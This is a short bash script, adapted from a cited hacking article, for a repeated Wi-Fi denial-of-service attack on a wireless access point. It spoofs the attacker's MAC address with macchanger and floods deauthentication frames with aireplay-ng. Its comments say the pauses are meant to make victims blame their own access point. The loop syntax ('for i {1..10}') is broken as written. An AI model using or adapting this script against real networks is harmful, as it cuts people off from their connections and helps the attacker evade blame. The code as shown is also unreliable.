#! /bin/bash

# This is continous Dos a wireless AP
# Based on this article from Hackers-Arise
# https://www.hackers-arise.com/post/bash-scripting-for-hackers-part-2-building-a-continuous-wi-fi-denial-of-service-tool
# Some APs will not allow this, and you will have to rewrite this script with the individual MAC addresses you want to de-authenticate.

# Creates a for loop that will execute our commands 10 times.
for i {1..10}

# Contains the commands we want to execute. Everything after the do and before the done will be executed in each loop
do

# Changes the MacAddress between executions 
	sudo macchanger -r wlan0
 
# Sends the deauth frames 100 times (the default is continuous) to the MAC address of the AP (-a) from the interface wlan0mon.
	sudo aireplay-ng --deauth 100 -a InsertMacaddressOfTargetAPHere wlan0mon
 
# Tells the script to sleep for 60 seconds. In this way, the clients will be able to re-authenticate for 60 seconds before you send another deauth flood. 
# Hopefully, this short interval will lead them to believe that the problem is with their AP and not you.
	sleep 60
# closes the for loop.	
done
